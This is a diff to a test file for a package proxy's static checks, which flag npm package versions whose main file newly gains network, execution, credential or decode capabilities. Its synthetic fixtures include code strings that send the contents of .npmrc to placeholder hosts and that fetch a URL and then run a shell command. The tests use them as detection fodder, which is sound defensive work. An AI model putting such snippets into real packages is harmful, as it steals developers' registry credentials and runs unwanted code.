@@ -1,4 +1,4 @@
-// 0.1.5 static checks S6 and S7 (operator rulings R2 and R3 2026-10-21), both CONTRIBUTING first, on recon's static-checks-1.4
+// 0.1.5 static checks S6 and S7 (operator rulings R2 and R3 2026-10-21), both CONTRIBUTING first, on recon's static-checks-1.4, then 1.5
 // (ruling R5: the runtime mirrors recon's tree; names provisional until the operator's naming ruling).
 //   S6 network-beacon-in-hook-target  a hook target with an API network sink (http-request, fetch, net-connect, websocket, xhr, axios),
 //                                 a host-identity source (os.hostname(), os.userInfo(), os.networkInterfaces() on os or require('os'),
@@ -10,7 +10,10 @@
 //                                 file is NOT_CHECKED, never a clean delta. Review verdict 2026-10-21 on ABSENT: a role is verified
 //                                 absent only on an archive read in full; the row says "verified absent" and "against an empty
 //                                 baseline"; coverage counts a verified-absent role as checked
-// Failing first: written before the code (1.3 -> 1.4). Tarballs are synthetic; nothing is run.
+// static-checks-1.5 (operator rulings R9, R9a, R9b 2026-10-22): S7 is an INDICATOR only when a role READ on the predecessor (non-empty)
+// and READ now gains a decode:* or obf:* class other than decode:Function, or an API network sink with an execution sink other than
+// exec:Function; every other gain stays on the row as a fact with why it was not named.
+// Failing first: written before the code (1.3 -> 1.4, then 1.4 -> 1.5). Tarballs are synthetic; nothing is run.
 import test from 'node:test';
 import assert from 'node:assert/strict';
 import fs from 'node:fs';
@@ -44,6 +47,10 @@ const URL_ONLY = 'const u = "https://collect.example.invalid/b"; module.exports 
 const HOME_ONLY = 'fetch("https://x.example.invalid/", { body: process.env.HOME });\n';
 const BEACON_BRACKET = 'const https = require("https");\nhttps.request({ host: "h" }).end(process.env["USER"]);\n';
 const OTHER_RECV = 'const https = require("https");\nhttps.request({ host: "h" }).end(getOs().hostname());\n';
+const NETEXEC = 'const cp = require("child_process");\nfetch("https://x.example.invalid/").then(() => cp.execSync("id"));\n';
+const NETEXEC_CRED = 'const cp = require("child_process");\nfetch("https://x.example.invalid/", { body: require("fs").readFileSync(".npmrc") }).then(() => cp.execSync("id"));\n';
+const NET_FUNCTION = 'fetch("https://x.example.invalid/").then((r) => new Function("r", "return r")(r));\n';
+const ATOB = 'module.exports = atob("aGk=");\n';
 const NETTY = 'const https = require("https");\nhttps.request({ host: "h" }).end(require("fs").readFileSync(".npmrc", "utf8"));\n';
 
 const file = (p, s) => ({ path: p, buf: Buffer.from(s) });
@@ -121,9 +128,14 @@ test('S67-U9 capabilityDelta: a NOT_CHECKED predecessor is checked before the co
   const NONE_DECL = { status: 'ABSENT', caps: [], files: [], not_checked: [], absent: 'none declared (no candidate on the keep list)' };
   assert.equal(S.capabilityDelta({ predecessor: { version: null, basis: 'b', status: 'NOT_CHECKED', reason: 'r' }, current: sum(READ([]), NONE_DECL) }).outcome, 'NOT_CHECKED');
   assert.equal(S.capabilityDelta({ predecessor: { version: null, basis: 'b' }, current: sum(READ([]), NONE_DECL) }).outcome, 'NOT_APPLICABLE');
-  const d = S.capabilityDelta({ predecessor: { version: '1.0.0', basis: 'b', summary: sum(ABS, NONE_DECL) }, current: sum(READ(['net:fetch']), NONE_DECL) });
-  assert.equal(d.outcome, 'INDICATOR'); assert.deepEqual(d.by_role.main.gains, ['net:fetch']); assert.equal(d.by_role.main.predecessor_role, 'absent');
+  // 1.5: a gain against a verified-absent predecessor role is a fact, never named (predecessor_nonempty false)
+  const d = S.capabilityDelta({ predecessor: { version: '1.0.0', basis: 'b', summary: sum(ABS, NONE_DECL) }, current: sum(READ(['decode:atob', 'net:fetch']), NONE_DECL) });
+  assert.equal(d.outcome, 'NONE'); assert.deepEqual(d.by_role.main.gains, ['decode:atob', 'net:fetch']); assert.equal(d.by_role.main.predecessor_role, 'absent');
+  assert.equal(d.by_role.main.predecessor_nonempty, false); assert.deepEqual(d.by_role.main.named, []); assert.match(d.by_role.main.not_named, /verified absent/);
   assert.deepEqual(d.coverage, { roles: 2, checked: 2, verified_absent: 1, not_checked: 0, note: d.coverage.note });
+  const n = S.capabilityDelta({ predecessor: { version: '1.0.0', basis: 'b', summary: sum(READ([]), NONE_DECL) }, current: sum(READ(['cred:npmrc', 'exec:child_process', 'net:fetch']), NONE_DECL) });
+  assert.equal(n.outcome, 'INDICATOR'); assert.equal(n.by_role.main.predecessor_nonempty, true);
+  assert.deepEqual(n.by_role.main.arms, ['net+exec']); assert.deepEqual(n.by_role.main.named, ['exec:child_process', 'net:fetch']); assert.deepEqual(n.by_role.main.gains, ['cred:npmrc', 'exec:child_process', 'net:fetch']);
   const u = S.capabilityDelta({ predecessor: { version: '1.0.0', basis: 'b', summary: sum(READ([]), READ(['exec:spawn', 'net:fetch'])) }, current: sum(READ([]), READ(['net:fetch'])) });
   assert.equal(u.outcome, 'NONE');
 });
@@ -139,20 +151,34 @@ test('S67-U4 S7 cold start: no earlier version served by this proxy is NOT_APPLI
   assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not applicable: no earlier version served by this proxy; armed by entry-path-change');
 });
 
-test('S67-U5 S7 fires when main gains capabilities the predecessor\'s main lacked; the row names the predecessor and its basis, and the coverage', async () => {
+const NOT_NAMED = 'no decode or obf class other than decode:Function, and no API network sink with an execution sink other than exec:Function';
+test('S67-U5 S7 fires (1.5) when main, read and non-empty before, gains an API network sink with an execution sink; the row names the predecessor, its basis, the arm and the named gains beside the full gain set', async () => {
   const S = await SC();
   const p = pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)]);
-  const r = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETTY)]), armed: 'entry-path-change', predecessor: p }), S7);
+  const r = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETEXEC_CRED)]), armed: 'entry-path-change', predecessor: p }), S7);
   assert.equal(r.result, 'WARN', JSON.stringify(r));
-  assert.equal(r.detail, `vs 1.0.0 (${BASIS}): main gained cred:npmrc, net:http-request; ${NOBIN}; ${COV(2, 1, 0)}; armed by entry-path-change`);
+  assert.equal(r.detail, `vs 1.0.0 (${BASIS}): main gained cred:npmrc, exec:child_process, net:fetch (net+exec: exec:child_process, net:fetch); ${NOBIN}; ${COV(2, 1, 0)}; armed by entry-path-change`);
+  const a = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', ATOB)]), armed: 'x', predecessor: p }), S7);
+  assert.equal(a.result, 'WARN'); assert.equal(a.detail, `vs 1.0.0 (${BASIS}): main gained decode:atob (decode-obf: decode:atob); ${NOBIN}; ${COV(2, 1, 0)}; armed by x`);
 });
 
-test('S67-U5b S7 against an empty baseline: the predecessor\'s main was verified absent, so every capability of the new main is a gain, and the row says so', async () => {
+test('S67-U5c S7 1.5 names no other gain: a network sink with a credential source, or the Function constructor on both arms, is a fact on the row with why it is not named', async () => {
+  const S = await SC();
+  const p = pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)]);
+  const r = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETTY)]), armed: 'x', predecessor: p }), S7);
+  assert.equal(r.result, 'ALLOW', JSON.stringify(r));
+  assert.equal(r.detail, `no gain named vs 1.0.0 (${BASIS}); main gained cred:npmrc, net:http-request (not named: ${NOT_NAMED}); ${NOBIN}; ${COV(2, 1, 0)}; armed by x`);
+  const f = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NET_FUNCTION)]), armed: 'x', predecessor: p }), S7);
+  assert.equal(f.result, 'ALLOW', JSON.stringify(f));
+  assert.equal(f.detail, `no gain named vs 1.0.0 (${BASIS}); main gained decode:Function, exec:Function, net:fetch (not named: ${NOT_NAMED}); ${NOBIN}; ${COV(2, 1, 0)}; armed by x`);
+});
+
+test('S67-U5b S7 against an empty baseline: the predecessor\'s main was verified absent, so the new main\'s capabilities are gains, kept as facts and never named (1.5)', async () => {
   const S = await SC();
   const p = pred('1.0.0', [{ role: 'main', path: 'index.js', state: 'absent', size_bytes: null, sha256: null, facts: null, reason: null }]);
-  const r = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETTY)]), armed: 'x', predecessor: p }), S7);
-  assert.equal(r.result, 'WARN');
-  assert.equal(r.detail, `vs 1.0.0 (${BASIS}): main gained cred:npmrc, net:http-request (against an empty baseline: predecessor main: no candidate file in the tarball (verified absent)); ${NOBIN}; ${COV(2, 1, 0)}; armed by x`);
+  const r = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETEXEC)]), armed: 'x', predecessor: p }), S7);
+  assert.equal(r.result, 'ALLOW', JSON.stringify(r));
+  assert.equal(r.detail, `no gain named vs 1.0.0 (${BASIS}); main gained exec:child_process, net:fetch (not named: predecessor main was not read and non-empty (verified absent): a gain against it is a fact, not the named condition); ${NOBIN}; ${COV(2, 1, 0)}; armed by x`);
 });
 
 test('S67-U6 S7 does not fire on the same capabilities, on url-literal alone, or on a current main verified absent', async () => {
@@ -180,11 +206,11 @@ test('S67-U7 S7 NOT_CHECKED: a refused predecessor archive, unreadable stored fa
   r = s7(pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)]), walkOf([{ path: 'index.js', buf: Buffer.from('a\0b') }]));
   assert.equal(r.result, 'SKIP'); assert.match(r.detail, /^not checked: current main index\.js was not read \(binary/);
   r = s7(pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)], { static_checks_version: 'static-checks-0.9' }));
-  assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not checked: predecessor 1.0.0: its facts were stored by static-checks-0.9, not static-checks-1.4; armed by x');
+  assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not checked: predecessor 1.0.0: its facts were stored by static-checks-0.9, not static-checks-1.5; armed by x');
 });
 
 // ------------------------------------------------------------------ end to end: the predecessor is the last version this proxy served
-// e: nine versions; 1.7.0 keeps index.js (benign); 1.8.0 moves main to lib/run.js, which sends .npmrc out -> entry-path-change arms
+// e: nine versions; 1.7.0 keeps index.js (benign); 1.8.0 moves main to lib/run.js, which fetches and executes -> entry-path-change arms
 const EV = Array.from({ length: 9 }, (_, i) => `1.${i}.0`);
 const REAL = (name, v) => ({ _npmUser: { name: 'maintainer', email: 'm@example.com' }, _npmVersion: '10.9.2',
   dist: { shasum: `shasum-${name}-${v}`, integrity: `sha512-${name}-${v}==`, tarball: `https://registry.npmjs.org/${name}/-/${name}-${v}.tgz`, unpackedSize: 1000 } });
@@ -193,7 +219,7 @@ const E = { name: 'e', 'dist-tags': { latest: '1.8.0' }, time: Object.fromEntrie
 const DOCS = { '/e': E };
 const TARBALLS = {
   '/e/-/e-1.7.0.tgz': tgz({ 'package.json': JSON.stringify(E.versions['1.7.0']), 'index.js': BENIGN }),
-  '/e/-/e-1.8.0.tgz': tgz({ 'package.json': JSON.stringify(E.versions['1.8.0']), 'lib/run.js': NETTY }),
+  '/e/-/e-1.8.0.tgz': tgz({ 'package.json': JSON.stringify(E.versions['1.8.0']), 'lib/run.js': NETEXEC }),
 };
 async function withProxy(fn) {
   resetDependencyCache(); forgetManifestHooks();
@@ -226,7 +252,7 @@ test('S67-E1 S7 end to end: 1.7.0 served first, then 1.8.0 (armed by entry-path-
     await get(`${base}/e/-/e-1.8.0.tgz`); await settle();
     const r = proxy.witnessDb.getLatestDecision('e', '1.8.0').gates_fired.find((g) => g.gate === S7);
     assert.equal(r?.result, 'NOTE', JSON.stringify(r));
-    assert.equal(r.detail, `vs 1.7.0 (${BASIS}): main gained cred:npmrc, net:http-request; ${NOBIN}; ${COV(2, 1, 0)}; armed by entry-path-change`);
+    assert.equal(r.detail, `vs 1.7.0 (${BASIS}): main gained exec:child_process, net:fetch (net+exec: exec:child_process, net:fetch); ${NOBIN}; ${COV(2, 1, 0)}; armed by entry-path-change`);
   });
 });
 
